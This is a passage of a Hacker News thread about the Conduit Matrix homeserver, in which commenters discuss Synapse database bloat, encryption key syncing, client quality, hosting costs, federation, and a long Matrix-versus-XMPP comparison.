Conduit release we will hopefully be able to create migration paths.replyrobobro 12 hours ago | prev | next [–] One thing I didn't like about Matrix: I had a single server with 3 or 4 other users. In a few months, the database ballooned to, like, 80GB. User-uploaded content, including text, was in the ballpark of 2 or 3GB. Is there any way to clear out the cache of data received from old servers, say, anything more than 2 weeks old, and re-retrieve it if needed?replywjbolles 11 hours ago | parent | next [–] Yeah, there are admin APIs that can clear old images, local and remote ones. For your specific scenario you probably want this one:https://matrix-org.github.io/synapse/v1.85/admin_api/media_a...My server is not federated but fairly active, and we treat it as ephemeral. We've configured it so anything older than a week or two gets reclaimed automatically, text and media.replyCameronNemo 10 hours ago | root | parent | next [–] Are you using synapse?replyCOGlory 10 hours ago | parent | prev | next [–] Yes, it's room/concersation states taking up all the space, and you can compress them.https://levans.fr/shrink-synapse-database.htmlhttps://github.com/matrix-org/rust-synapse-compress-statereplylightedman 10 hours ago | root | parent | next [–] That it generates that much cruft for something so simple is disappointing. How long does the compression bandaid work for?replyCOGlory 9 hours ago | root | parent | next [–] From the first link:>I shrunk my homeserver database from 100GB to a little under 8GB, during a long maintenance cleanup.I run the compressor on a cron job. I've been running for 5 years with ~ a dozen people on my server, all federated, in multiple large rooms, didn't run into space issues until this year. On Linode $10 and then Hetzner 4 CPU.One thing to watch out for: disable registration. Otherwise spambots will register accounts, join the largest matrix.org rooms to spam, and then you'll have to store all that crap for all those rooms.replyjeltz 6 hours ago | root | parent | next [–] I feel registration is something which should come disabled by default and need to be explicitly enabled.replynani8ot 3 hours ago | root | parent | next [–] At least on Conduit and Dendrite that is the case iirc, but it's easy to forget to disable it once you register an account.replytoastal 7 hours ago | parent | prev | next [–] This is one of those things that make me appreciate XMPP. There’s no expectation to duplicate the entire history of chatrooms. Many MUCs default to the last 20 messages, which is usually enough to let you catch & jump in on the conversation. Costs of running my server have been quite cheap.replyhparadiz 8 hours ago | prev | next [–] Is there a way to migrate from Synapse to this? I don't know if I can justify destroying 6 years of conversation history.replynani8ot 3 hours ago | parent | next [–] Not yet. There're plans to build migration tool for Synapse to Dendrite, but support for Conduit would need to be built in as well.Either way, it's unknown how long it'll take.The tracking issue for Synapse -> Dendrite migration is all I've found. https://github.com/matrix-org/dendrite/issues/1705replynyanpasu64 6 hours ago | prev | next [–] On the topic of Matrix, does anyone know what causes messages to sometimes decrypt the last message until a new last message is sent (and fails to decrypt), or a single message to fail to decrypt while surrounding ones work successfully?replyArkanosis 1 hour ago | parent | next [–] My understanding is still imperfect, but I'll try to provide some info:Not all messages are encrypted with the same key, so if all of your clients are not connected at the same time, and the same is true for the sender, they can't exchange their keys. When that happens, each client can only decrypt the subset of the messages for which it has the keys. Also note that clients only exchange their keys with other verified clients.If you look at the “session_id” attribute of the JSON source of the messages, you'll see that for a given session (ie. when the sender is logged in a client), all the messages are decrypted (which means you have the key for that session) or none of them are (which means you haven't received the key for that session yet).replydang 10 hours ago | prev | next [–] Related:Conduit Beta – Matrix chat server - https://news.ycombinator.com/item?id=28385840 - Sept 2021 (69 comments)replyinfogulch 9 hours ago | prev | next [–] Conduit is a very cool project, but unfortunately it seems difficult to follow the status and progress short of reading all commits and issues.I'm excited for the recent progress on the built-in Sliding Sync feature because it's much easier to deploy.replyparski 3 hours ago | prev | next [–] I use Conduit with Element clients and from time to time I will have problems decrypting messages. Sometimed they'll stay unencrypted for a week. I only talk to people in a room on the official matrix.org server. They're all registered there. Does anyone else get that issue ever?replyArkanosis 1 hour ago | parent | next [–] My (imperfect) understanding is that this is because of how end-to-end encryption works: you not only need to receive the messages (which are stored on the server, so you don't have to worry about them as you can retrieve them when you want), but also the keys to decrypt these messages (which are only stored on the clients, so whether or not they are available depends on you).Possibly, one of your clients has the keys needed to decrypt one of the messages, but you're using another client which doesn't. Things go back to normal when both are connected at the same time and can share the keys, or when the client of the sender is connected and still has the keys.If you don't keep your clients connected all the time, you can use a secure backup on the server, so the clients can retrieve the encrypted keys from the server and decrypt them locally.Not having the keys happens more often if one the parties uses short-lived sessions (like logging exclusively in a private browser window, for example).This article helped me with understanding a little: https://gerstner.it/2021/02/matrix-and-e2e-encryption-or-how...replyruslan 11 hours ago | prev | next [–] Can someone please explain, why use Matrix while there's XMPP ?replyj1elo 3 hours ago | parent | next [–] Because summaries like this still stand up as of today:https://news.ycombinator.com/item?id=8998290> XMPP is great for what it was designed for. It doesn't work well with mobile, high packet loss & high latency connections. XMPP is talkative and bandwidth intensive - bad for limited data/battery applications. It also wasn't designed for today's 1 person multiple devices reality. Most XMPP servers let you log in multiple times but messages don't sync between clients and sometimes get delivered to the client the user isnt currently in front of.> Also, sending files over XMPP has pretty much always sucked - there are a bunch of incompatible ways to do it and it's always been hit and miss depending on which client your chat partner was using, network topography, etc.Also, overload of XEPs doesn't help the ecosystem. Too many optional extensions hinders interop. People expect more features in modern chat experiences than what XMPP was designed for, and that's what XEPs have tried to fix as a bandaid, with mixed results.On top of that, the technology choices are par of the course for the time it was designed, and nowadays there are arguably better things. Devs are naturally driven to choose tech that makes their work nicer, if they enjoy it, so that means more stuff gets done for the newer platform, in this case. As an example, coincidentally, another HN post today was touching on one of those points - the need for a very advanced XML parser, as a typical one apparently wouldn't be enough:https://news.ycombinator.com/item?id=36930196replyAndrew_nenakhov 1 hour ago | root | parent | next [–] > It doesn't work well with mobile, high packet loss & high latency connections.This is an absolutely false, baseless statement, mostly amounting to FUD. Messages work well on mobile, and they sync between devices just fine.> Also, overload of XEPs doesn't help the ecosystem.On the contrary, XEPs create the ecosystem. As I often say, Matrix is not a protocol, it's a product with an API created by a single organization.replysdflhasjd 1 hour ago | root | parent | next [–] I worked briefly on a mobile XMPP chat solution a few years ago, and considering this was when 3G was the best you could get and the application had to deal with some pretty bad connections, I don't remember XMPP having any intrinsic limitations like that.replyerinnh 10 hours ago | parent | prev | next [–] My first thought was: „my question would be the reverse“. I have no idea why I’d use XMPP, so I will tell you what I like about Matrix.- modern chat solution with features people have come to expect from Slack and Discord- many bridges that have kept me from having to use more than one chat client for multiple protocols (think pidgin)- lots of great communities are on matrix- pretty good voice chat- open source- selfhostedThose are my main reasons why I like Matrix. My question to you would be: what do you like about XMPP?replyruslan 8 hours ago | root | parent | next [–] XMPP is well-defined open source selfhosted easily extendable federated standard for exchanging data containers (messages) in a sequential manner. I have zero experience with Matrix, but have experience developing Jabber clients (both mobile and desktop), developing XMPP server, services and VoIP gateways back in mid 2000th. I can say that XMPP with it's all-covering XEPs can satisfy needs of anyone today. Why would people need something else like Matrix ? I'm trying to understand what motivated Matrix development. Can Matrix provide anything that is completely missing in XMPP beside bad PR ?XMPP gained bad publicity as overcomplicated XML based protocol which was abandoned by Google in favour of their proprietary solution somethere in 2011. Till then it had been worshipped as one of the best open standard ever developed.replyCorsome 6 hours ago | root | parent | next [–] Matrix has well maintained clients and the overall experience is smooth especially for non technical people.Source: I use XMPP and Matrix daily.replyMattJ100 6 hours ago | root | parent | next [–] What XMPP client(s) are you using that are not well maintained? And why?replyjeltz 12 minutes ago | root | parent | next [–] I used to use Pidgin and as for the why: I had used Pidgin for many years to AIM, MSN, etc.replyopan 3 hours ago | root | parent | prev | next [–] Dino and Gajim both crash frequently on Wayland (Sway in particular) due to GTK issues that I'm not expecting to be fixed any time soon. Gajim also gets very slow the longer it's open, can't recall if Dino was the same. Dino also has the usual GNOME-y issues of being over-simplified and lacking in customization and features. When I changed from Dino to Gajim I was shocked at all the stuff I could suddenly do, was weird to think both were XMPP clients.Something with Gajim's features but using Qt would be pretty great potentially. GTK stuff also often has this horrible thing where it fades the window when unfocused, which gets really awful and unresponsive when things get laggy, also ruins screenshots. Never figured out how to turn it off. Part of the theme apparently, but GNOME also doesn't want you customizing/changing your theme. I'm just using Adwaita-dark usually.Matrix clients aren't great either, but overall Nheko gives me less trouble and pain than Gajim, using both daily. irssi (IRC client) is kind of my gold standard for stability/performance/features with weechat being mostly okay too.replyMattJ100 3 hours ago | root | parent | next [–] If you're an irssi/weechat person, I use poezio as my primary client (and profanity is another console client, but I've never tried it). Obviously console clients lack some features (calls, avatars [usable ones, anyway]) but it does the job for me. I do use a Conversations fork on my mobile for communicating with family while I'm out and about, as it's nice to have calls and such then.replyptman 5 hours ago | root | parent | prev | next [–] https://matrix.org/docs/legacy/faq/ there are some answers to \"why not xmpp\"replyFreie_Messenger 6 hours ago | root | parent | prev | next [–] > „my question would be the reverse“. I have no idea why I’d use XMPP> My question to you would be: what do you like about XMPP?Same things & more:- modern chat solution with features people have com to expect from WhatsApp- many bridges that have kept me from having to use more than one chat client for multiple protocols (think pidgin)- many great messengers have discovered XMPP as a great base for their system- lots of great communities are on XMPP- realistic participant counts in public chat rooms - no counting dead (former) members- pretty good video & voice chat- open source- selfhosting possible- fewer concerns about data protection and privacy- more resource efficient (less memory required, lower CPU utilization)And:- The use is possible and allowed everywhere where e-mail is in use.replyDoItToMe81 2 hours ago | root | parent | next [–] What are your favorite clients? My issue with XMPP is that many clients lack modern conveniences, and it's not easy to get people on board for that reason.replyMattJ100 2 hours ago | root | parent | next [–] Which modern conveniences do you find are lacking, out of curiosity?replyLanternLight83 5 hours ago | root | parent | prev | next [–] My 2c might not crush the scale, but FWIW I'd expect XMPP clients to be easier to work with if I had existing PGP keyrings that I wanted to re-use, favoring consistant identities and protocols over more stringent avoidance of key re-use. Could be a key on a smartcard, or the key your employer kept a revocation certificate for.Conversations has great support for OpenKeychain on Android, and I'd love to see that come to competing protocol Deltachat but the devs are focusing on cross-platform behaviors atm. Android-specific fork Deltalabs might be willing to be upstream for it if anyone knows where to start with that.replyEgregiousCube 8 hours ago | root | parent | prev | next [–] What is a good way to discover great communities on Matrix?replykitkat_new 2 hours ago | root | parent | next [–] This is the way to go:https://matrixrooms.info/replyFreie_Messenger 6 hours ago | root | parent | prev | next [–] https://www.freie-messenger.de/en/matrix/#chat-roomsreplyjohnny22 10 hours ago | root | parent | prev | next [–] xmpp did most of that first before it fell off :(replyrhn_mk1 9 hours ago | root | parent | prev | next [–] > what do you like about XMPP?- plenty of fast native clients- server resource usage- simplicity of the protocol, especially the encryptionreplyrglullis 8 hours ago | root | parent | next [–] > plenty of fast native clientsAnd God help you making all of them talk to each other properly...replyleetnewb 6 hours ago | root | parent | next [–] I have used conversations (and derivatives), gajim, dino, converse.js, and movim to have omemo encrypted xmpp conversations; and I talk to people on Siskin and have used profanity in the past. Seems to work properly, unless I'm missing something.replyj16sdiz 6 hours ago | root | parent | next [–] Before XEP-0459, every client implement their own subset of standard and seldom talks with clients that implement a differnt subset.replyrglullis 6 hours ago | root | parent | prev | next [–] Now try to make a voice and/or video call.replyprogval 2 hours ago | root | parent | next [–] Does any Matrix client support voice/video calls other than Element (including Hydrogen as it shares Element Web's codebase)?replytimokoesters 2 hours ago | root | parent | next [–] Fluffychat supports it too. Check out https://matrix.org/ecosystem/clients/, you can click the clients for a feature list.replyleetnewb 5 hours ago | root | parent | prev | next [–] I do/have, with conversations, siskin, movim, and I think dino. Can you expand on your experiences?replyrglullis 5 hours ago | root | parent | next [–] gajim, pidgin, dino... none of them worked when I tried to call from my desktop to my Conversations' app on Android.replykitkat_new 2 hours ago | root | parent | prev | next [–] > - simplicity of the protocol, especially the encryptiononly simple for developers though - due to the lack of Cross Signing it is very difficult to keep communication secure.replyrhn_mk1 33 minutes ago | root | parent | next [–] What is cross siging in the messaging context?replykitkat_new 8 minutes ago | root | parent | next [–] implicitly verifying all (including future) of somebody's devices although running through the verification process only once.Without it, e.g. if you log into a new session, you have to verify with all your contacts before you can safely use that session for communicationreplyFreie_Messenger 7 hours ago | parent | prev | next [–] Matrix is like chatting via GIT (distributed databases) and tends to be a team messenger like Mattermost or Zulip - XMPP is structurally like email (but with options like online status, currently typing, last online, ...) and is often used by large messenger services (e.g. WhatsApp uses its own variant of XMPP).XMPP is the only system that can and may(!) be used wherever email is in use.XMPP is just as \"modern\" as Matrix, but has a _different _ data storage/distribution idea.Comparison: https://www.freie-messenger.de/en/systemvergleich/xmpp-matri...replyruslan 6 hours ago | root | parent | next [–] Thanks!replypkulak 7 hours ago | parent | prev | next [–] Matrix is more like a state synchronization service than a way to send messages. If I join a room on another Matrix server, my server will begin maintaining a copy of that other sever for me to use how I like. If I shut my server down for a day, it will sync back up when it comes back.I’m not sure if XMPP works like that, but I always thought it was more like email: send a message, maybe retry a bit, but that’s about it. Not sure how transient things like presence, read receipts, and typing notifications work either, across servers.replynine_k 10 hours ago | parent | prev | next [–] There's the least common denominator XMPP, with a lot of key functions under optional XEPs. Thus the user experience is very uneven across clients and servers.Matrix has a more defined set of important features, so you could expect that conforming clients all implement them uniformly, without surprises.replyCameronNemo 10 hours ago | root | parent | next [–] This argument seems so weird to me because the matrix ecosystem definitely does have complete and non-complete clients. Just like the XMPP ecosystem. And as for servers... Dendrite and Conduit are not 100% compatible with Synapse.I imagine there must be some good clients for XMPP. Hell, I use one good client (Conversations on Android) on a daily basis. Also have used Gajim quite a bit. It is alright afaict.replytcfhgj 7 hours ago | root | parent | next [–] What does complete even mean regarding XMPP?It's not even possible there, because you have conflicting proposals while on Matrix you have a coherent specificationreplyMattJ100 7 hours ago | root | parent | next [–] Compliance with the annual compliance suites would be one definition. This compliance level is discoverable in the xmpp.org software listing, for example: https://xmpp.org/software/conversations/replyfreeopinion 10 hours ago | root | parent | prev | next [–] Funny, I recently got pretty frustrated looking for a decent Matrix client. Not even Element claimed to support the full list of features on the Matrix website. And Element has super bizarre behavior like not allowing to paste into the message composer. And good luck getting help when a client doesn't work.That said, I can't claim XMPP clients are any better.replyArathorn 10 hours ago | root | parent | next [–] Element is basically 3 different clients - web, ios and android are different codebases. Paste to composer should work on all of them tho! Meanwhile on mobile there is a new client called Element X which is a single codebase built on matrix-rust-sdk: https://element.io/blog/element-x-experience-the-future-of-e....Classic Element should support every specced feature in Matrix tho, and tonnes of MSCs, so unsure what features you’d be missing. Meanwhile Element X is less featureful, but way more performant and stable (we’re aiming for better-than-telegram UX and perf).replyfreeopinion 9 hours ago | root | parent | next [–] Thanks for the reply. I saw your demo of Element X a while back and it looked awesome. I'm excited for it to show up for desktop use.Of course you are already familiar with https://matrix.org/ecosystem/clients/element/. I know it is pretty ticky to point out that \"Multi Account\" is not supported, but it happened to be a feature I was particularly looking for in my search. My IRC client, for instance, lets me be logged into multiple servers with different accounts at the same time. Yes, I know that a single account on one server can communicate across all federated servers. The same is true for email, yet my email client allows me to use multiple accounts. I'm heartened to see that you have included the feature on your checklist. I hope that means somebody is thinking about it.I know that Element should allow me to paste into the composer. I was told exactly that in the matrix room when I asked. \"Works for me\" is as frustrating a response as ever. I've seen the issue reported a number of times by different people with pretty decent detail, but I haven't seen a solution. Just \"works for me\" responses.I'm still a Matrix user. I just accept that I don't have everything smoothed out the way I'd like. My post above was just a response to the claim that XMPP clients don't have uniform features. Well, as you know, neither do Matrix clients. But you weren't the one making that argument.Don't take my posts as negative criticism, even if there is some criticism there. Keep up the great work. Keep getting better.replynani8ot 3 hours ago | root | parent | next [–] FluffyChat does have multi-account support, but it's also a feature I'm missing on Element.replyxethos 5 hours ago | root | parent | prev | next [–] > we’re aiming for better-than-telegram UX and perf)Oh thank god - my (admittedly not-brand-new) phone doesn't have quite enough RAM to keep Element fed and happy. 300 meg doesn't sound like much till all apps are limited to the ~2GB left over after the OS takes it's cut.Element supports stickers though, and I haven't found any other Android clients that support stickers while also being lighter.Kudos though - Matrix has come a long, long way since I first played around with riot.im!replyjeltz 5 hours ago | root | parent | prev | next [–] Do you plan to do something like Element X but for desktop?replyCOGlory 10 hours ago | root | parent | prev | next [–] I paste into Element all the time, on web, desktop, and Androidreplyrhn_mk1 9 hours ago | root | parent | prev | next [–] > Element has super bizarre behavior like not allowing to paste into the message composerIt requires the clipboard API. Puzzling decision, given that native pasting worked before, but here we are.replyprmoustache 8 hours ago | root | parent | prev | next [–] In practice, it only works better if you stick to element so it is pretty much the same. The difference being that they ship a full featured web version so anyone with an OS that support modern web should be able to support it.replypmlnr 8 hours ago | parent | prev | next [–] Preference, I guess. It appeals to the masses who are growing up on discord and slack.I also prefer XMPP.replyziftface 10 hours ago | parent | prev | next [–] Isn't xmpp old style instant messaging? As in, if you miss a message because you had poor connection or the application wasn't running then it's gone?Matrix does not work this way.replyrakoo 37 minutes ago | root | parent | next [–] That was true 20 years ago. For the past 10+ years XMPP has had Stream Resumption that allows you to resume a few stanzas you missed recently (typically with a poor connection), and Message Archive Management that stores everything on the server that you can then retrieve on the client.XMPP has had little place on the public stage, but that doesn't mean it stopped evolving.replykitkat_new 4 minutes ago | root | parent | next [–] > and Message Archive Management that stores everything on the server that you can then retrieve on the client.if and for how long will be decided by the person who is running the server the chat room was created onreplyFreie_Messenger 6 hours ago | root | parent | prev | next [–] > Isn't xmpp old style instant messaging?No.XMPP is just as \"modern\" as Matrix, but has a _different _ data storage/distribution idea.see: https://news.ycombinator.com/item?id=36939676replytherein 10 hours ago | root | parent | prev | next [–] XMPP supports delayed delivery. It works although I have had minor issues with it, especially if OMEMO is enabled.https://xmpp.org/extensions/xep-0203.htmlreplymaccam912 10 hours ago | parent | prev | next [–] Network effect? I use matrix today. What does xmpp have that I should switch for?replyrakoo 36 minutes ago | root | parent | next [–] You can run a functional server for multiple people on a very low-power device.replytoastal 6 hours ago | root | parent | prev | next [–] XMPP by its extensible nature can be a social network (Movim), a community organizer (Libervia), or can be used for basic presence, etc. & these can sit atop your XMPP server (Prosody, ejabberd, etc.). Matrix, without extensibility, is kinda relegated to chat (text, voice, video) only. The push-based servers make clients efficient, and both Prosody & ejabberd can be UnifiedPush server with a basically a boolean flip in the config—interestingly can be a push server for Element & other Matrix clients instead of relying on Google.replyptman 5 hours ago | root | parent | next [–] Matrix is very extensible. You can start sending your own yc.toastal.test.first event type and put any json as valuereplyCameronNemo 10 hours ago | root | parent | prev | next [–] JMP.chatSpeaking as a user of both element generally and Cheogram/JMP.chat.I still use both.replysoulmerge 8 hours ago | parent | prev | next [–] For me it's about federation. I have my own server and chat with my family there. And I also have friends with accounts elsewhere and I can message them as well.And I'm looking forward to integrations (Slack, Signal, ...) being more user-friendly, and easier to install, configure and maintain, so I can message others, too.replyCameronNemo 5 hours ago | root | parent | next [–] XMPP is federated and has some integrations (among them, SMS/MMS and phone call support).replyrjvs 12 hours ago | prev | next [–] How does this relate to Synapse? Dendrite tests against https://github.com/matrix-org/sytest and has issues for “are we synapse yet” — I can’t see any discussion of this for Conduit (not even a discussion on why they don’t want to be like Synapse).replyTheCycoONE 11 hours ago | parent | next [–] Conduit is a 3rd party implementation of the matrix server spec in Rust. Synapse and Dendrite are both first party where Dendrite was originally intended to replace Synapse.The selling features are lightweight and simple to setup, implying that Synapse is not. It is more importantly a validation of the matrix server specs and over the years they have done quite a bit to get ambiguities clarified.replywkat4242 8 hours ago | root | parent | next [–] Originally intended? So dendrite is not slated to replace synapse anymore? I know the 'eventually' has become a bit of a running joke but I thought this was still the plan.It's a shame there's no upgrade path though. With retention of history.replynani8ot 3 hours ago | root | parent | next [–] It seems like there're so many important deployments of Synapse that they need to keep it going. And I've read that the performance is way better than a few years ago.At some point Dendrite was slated to support micro services on different machines to be able to scale up, but now they only support monolith deployments. It's aimed at \"small\" deployments and is used in their P2P efforts.replyCameronNemo 11 hours ago | parent | prev | next [–] Looks like SyTest is primarily oriented towards use with Synapse, and the dendrite folks are wrapping it up for their own CI integration. Perhaps Conduit could reuse some of their work, although IIRC Conduit is using GitLab and Dendrite is using GitHub Actions.Separately, it seems that Conduit is not orienting itself as a drop in replacement for Synapse. At least at the current moment. There are a number of notable feature gaps that I recall being mentioned last time I was in the Matrix room.replyrkagerer 3 hours ago | prev | next [–] Are there any accessible deep-dives on Matrix speaking to how trustworthy / effective the privacy claims are, reliability of the code, etc?replygbraad 11 hours ago | prev | next [–] I might have missed something, but the page is very simplistic and assumes you know what Matrix is and how to use this; a lot of time is spent on the installation through different means, but none how to use the server itself, either by use of a client?replyTheDong 11 hours ago | parent | next [–] The first link on the page is to matrix.org. matrix.org links to clients: https://matrix.org/ecosystem/clients/You probably would want element.I think conduit's page is doing the right thing. It doesn't really assume you know what matrix is, but rather assumes you're smart enough to click on a link if you don't know.replyldoughty 3 hours ago | root | parent | next [–] I agree with the grandparent -- while trying to determine what this was, I looked at other links to try and find the answer and went down the wrong path.> Users from every Matrix homeserver can chat with users from all other Matrix servers.This statement lead me to assumed the \"matrix specification\" discussed was about server-to-server communication... I'm not interested in digging into the underpinnings of this server-to-server communication (right now) just like I'm not terribly interested in how blockchains keep in sync across nodes... But I am interested in how this whole stack works, and I was lost with this page as the starting point.So I think it's safe to add an extra sentence to explain the relationship while still keeping the page simplistic and focused.replyRamblingCTO 2 hours ago | root | parent | prev | next [–] Hard disagree. One of the worst landing pages I've ever seen. What exactly is it? Just a backend? Client? Don't waste my whole screen with the logo and a wannabe catchy phrase. Just tell me the gistreplylenova 11 hours ago | parent | prev | next [–] The landing page is pretty good if you are familiar with Matrix.org, and I'm assuming that it's aimed at Matrix developers. Personally I appreciated the brevity, simple declaration of the problem it's trying to solve, and a quick link to the real call to action (the Git repo).EDIT: realizing that the landing page may have been updated with new content itself since your original post.replygbraad 10 hours ago | root | parent | next [–] I would hope the audience targeted is admins/deployers instead of developers, as you would like to drive adoption.replylenova 9 hours ago | root | parent | next [–] Shall we meet at the middle ground and call it DevOps? ;-)replyFreie_Messenger 6 hours ago | parent | prev | next [–] > ...assumes you know what Matrix is ...Matrix is a chat protocol. It works like chatting over GIT (distributed databases) and is more like a team messenger like Mattermost or Zulip. Conduit is a server software and not for end users.More information about Matrix: https://www.freie-messenger.de/en/matrixreplykitkat_new 2 hours ago | root | parent | next [–] > and is more like a team messenger like Mattermost or Zulip.if at all, Element is this.Matrix doesn't really care about what type of users the clients targetreplygbraad 1 hour ago | root | parent | next [–] And that is my point. While I use Matrix, it is confusing by itself as you need the client, which was hosted as riot.im, now element, etc. For a newcomer this page is just as confusing whle it could be a great entry as it being so lightweight compared to the actual Matrix server. Some additional notes will help a lot.replyCameronNemo 11 hours ago | parent | prev | next [–] Was the link changed?What is Matrix?Matrix is an open network for secure and decentralized communication. Users from every Matrix homeserver can chat with users from all other Matrix servers. You can even use bridges to communicate with users outside of Matrix, like a community on Discord.And I see no installation information.replynani8ot 3 hours ago | root | parent | next [–] I don't know about the previous link, but conduit.rs has a Link called \"Documentation\" at the top of the page.Installation is downloading a binary, setting up autostart and writing/copying a 10 line configuration.toml.replyCameronNemo 3 hours ago | root | parent | next [–] You're not understanding. The parent commenter said that the link was showing lots of installation options, but the link does not show that. I know there are installation instructions elsewhere, but I was just responding to what the parent was claiming about this link.replynani8ot 46 minutes ago | root | parent | next [–] Oh right. Thank you, that went over my head.replymgaunard 3 hours ago | prev | next [–] How does it compare to a simple IRC server?replydevy 7 hours ago | prev | next [–] Has anyone implemented Conduit with other backend services via the Matrix API?https://spec.matrix.org/latest/Any reason why it's not a good idea to integration the API with server side (aka E2E or distributed drawbacks?)replylannisterstark 7 hours ago | prev | next [–] It's still broken for bridges when compared to synapse. Bots rarely register, and sometimes you have to manually log into the account etc.On the other hand, their dev matrix channel is very active. Props to that. Still...beta software.replyteruakohatu 8 hours ago | prev | next [–] What would be the minimum Digital Ocean droplet that could run this server for maybe 10 people?replyBlack616Angel 8 hours ago | parent | next [–] I didn't know Digital Ocean before, but it seems like they are more focused on CPU than on disk space. This is bad, since you will need to store some data on the server, if you send any images at all. We have a matrix-server running for 4 people since maybe 2019 and it's at 60gb disk usage right now. So in that regard, 10 memers will need at least a 100gb so 24$ a month, but you can get a lot cheaper than that, using some other server hosters, which are more focused on giving you a lot of space instead.Specs: The server we use has 4 cores (barely uses 1) and 8 gigs of RAM, 2.5 of which are currently used and 120gb of disk space, that will probably suffice for another 2-3 years.replypkulak 7 hours ago | root | parent | next [–] You can always mount in an S3 bucket and use that instead of the local drive.replytgv_hk 7 hours ago | parent | prev | next [–] Hi, I been running Conduit in a \"Allways free\" droplet at Oracle Cloud.Its been working without problems for a single user setup (no VoIP though).I hope you get an idea of the minimum resources needed.replynani8ot 3 hours ago | parent | prev | next [–] Matrix does not need much resources per user or room But if any user joins a large room with thousands of people, the server will need to keep up with all those state events.So 100s of users wouldn't be much of an issue if they're mostly in the same room.replylibraryatnight 6 hours ago | prev | next [–] Synapse is kind of a pain, I think I'll give this a shot.replyblacklight 6 hours ago | prev | next [–] I have tried Conduit in a small test installation, I liked what I saw, and I keep following its developments.However, I also spent a lot of time configuring my Synapse server with tons of bridges, so even though I totally get the need for more \"lightweight servers\" (especially in order to break the Synapse de facto monopoly on Matrix implementations), I'm unlikely to use it as a primary driver unless some killer feature (like native Fediverse integration, at least via Fedi authentication) is implemented.replyest 12 hours ago | prev | next [–] how does it compare to Zulip?replydsr_ 11 hours ago | parent | next [–] Zulip isn't a Matrix server. Zulip doesn't federate.If you want a private, non-federated chat server -- for your organization, basically -- Zulip is awesome.If you want federated chat, Zulip doesn't do that.replysomenewaccount1 11 hours ago | root | parent | next [–] Since every matrix server requires you create its own user id, I never understood the benefit of being federated.replyCameronNemo 11 hours ago | root | parent | next [–] HN needs a federation megathread. It gets widely debated every other week lol. Anytime Mastodon, Email, Matrix, or XMPP get brought up, the old culture war gets revived.replySemaphor 11 hours ago | root | parent | prev | next [–] You don’t need to sign up to multiple servers, if you can use the ID you already have to talk with everyone on other servers. Just like with E-Mail or XMPP.replyvkbjlnjknbj 11 hours ago | root | parent | prev | next [–] it works the same way email does.you can use a mozilla.com user id to talk to someone with a matrix.org user id, or a kde.org user idall servers are equal participants in rooms, so a room doesn't live on a specific server aside from servers being able to create friendly names pointing to them, but nothing stops #foo:kde.org from pointing to the exact same room as #bar:mozilla.org -- both servers are participating equally and have their own shortcut name to the roomreplyjazzyjackson 10 hours ago | root | parent | next [–] I can federate message across hosts, fine, but I can't move my username to another host, so it doesn't work like email, because with email the namespace is defined at the DNS level, and I just forward requests to whatever email host I want to use.Being able to leave one server and join another while maintaining an identity (say, a public key for instance) is on Matrix's to do list, they haven't decided how to do it yet afaik.replyArathorn 10 hours ago | root | parent | next [–] https://github.com/matrix-org/matrix-spec-proposals/blob/keg... is how we’re doing it, and it’s being implemented currently in Dendrite.replySemaphor 10 hours ago | root | parent | prev | next [–] With webfinger, you should be able to do exactly that. Migration of accounts is not in E-Mail, but while email has mx servers, Matrix (and most nu-fed stuff, not sure about XMPP) should have webfinger support for that.edit: Okay, not actually webfinger. But [0] has instructions for the `/well-known/matrix/server` way. It only talks about subdomains, but it should work across domains. Possibly also with the SRV header.[0]: https://github.com/spantaleev/matrix-docker-ansible-deploy/b...replyFreie_Messenger 6 hours ago | root | parent | prev | next [–] > it works the same way email does.No.Matrix is like chatting via GIT (distributed databases) and tends to be a great team messenger like Mattermost or Zulip - XMPP is structurally like email ...-> see: https://news.ycombinator.com/item?id=36939676replyMayeulC 5 hours ago | root | parent | next [–] You are talking about two different things. Parent was explaining what federation was. Both XMPP and Matrix are federated, just like e-mail.And I'd say that Matrix is closer to e-mail and XMPP than you seem to assume. Once the database is synchronized, it works pretty much the same way. Only if a missing message is detected in the graph, then a server makes another request for the messages it missed (backfill).Moreover, Matrix and Git are quite different, since you want to be pedantic. Both the synchronization protocol, and conflict resolution are handled differently (Git does very little, Matrix is more like a CRDT in that respect).replyinfogulch 11 hours ago | root | parent | prev | next [–] Apparently there's an idea for a feature to enable users to transfer their account and data from one federation node to another. Pretty sure it's in the \"just an idea\" phase, so don't hold your breath.replyCameronNemo 11 hours ago | root | parent | next [–] Would be nice to transfer identity to a new domain but leave the server the same, like we typically do with email.replyj16sdiz 6 hours ago | root | parent | next [–] Not understanding your claim...How can I \"transfer identity\" to a new domain in email?I can't move myusername@gmail.com to @outlook.com, nor can I move myusername@someisp.com to myusername@anotherisp.com .replye12e 4 hours ago | root | parent | next [–] Well, with email you can a) forward from one address to another b) set up an auto-reply (I've moved), c) copy your message history via imap/maildir/mbox-files. Ditto for address book(s).replygorgoiler 10 hours ago | parent | prev | next [–] Does Zulip have video calls and screen sharing? I took their “feature tour” just now and it seems 100% chat focused.https://zulip.com/Matrix (Synapse / Dendrite / Conduit / Element) all support audio and video as well as text.replybhanu423 6 hours ago | root | parent | next [–] It has Zoom and Jitsi integration, which lets you create instant meeting on these platform. Anyways the killer feature of zulip that I find is its usage of threads, much more usable than slack threads which gets super overwhelming for me.replyshortrounddev2 11 hours ago | prev | next [–] When I tried Matrix I found a lot of super right wing tech people using it. The main reason I could ascertain most of them were using Matrix was because they had been banned by other chat platforms for their opinionsreplydugite-code 10 hours ago | parent | next [–] Matrix is a protocol not a service.This will always be an \"issue\" of decentralized services, just look at the Lemmy devs over on Lemmygrad, super far left. Anyone can host a server running a protocol, lets not throw the baby out with the bath water just because people are saying something objectionable in one server. If you don't like these people join/make an instance that doesn't interact with them.replyerinnh 10 hours ago | parent | prev | next [–] I use it regularly. There probably are those communities you are talking about, but I haven’t personally seen them, so my advice would be to ignore them and join those that more align with what you’d like to see.I’ve found many nice and welcoming communities on matrix.replyfreeopinion 10 hours ago | parent | prev | next [–] I've heard a lot of super right wing tech people also use email, cell phones, Twitter, and TikTok. I heard some of them drive Fords, too.replypanick21_ 6 hours ago | parent | prev | next [–] Like Mozilla and GNOME. And the left wing CCC. They were all banned everywhere.replyCameronNemo 11 hours ago | parent | prev | next [–] Yeah you can find some ... Strange characters... off in the fediverse.replycamdenlock 11 hours ago | parent | prev | next [–] That says more about those “other chat platforms” than anything else.replyryanolsonx 11 hours ago | prev [–] How does this compare with Conduit? [1][1] https://demo.realworld.ioreplylenova 11 hours ago | parent [–] They don't appear to be related technologies at all, apart from the similar names?replyCameronNemo 11 hours ago | root | parent [–] I can only assume the commenter was attempting to poke fun at the number of comments asking \"How does this compare to X?\".replylenova 11 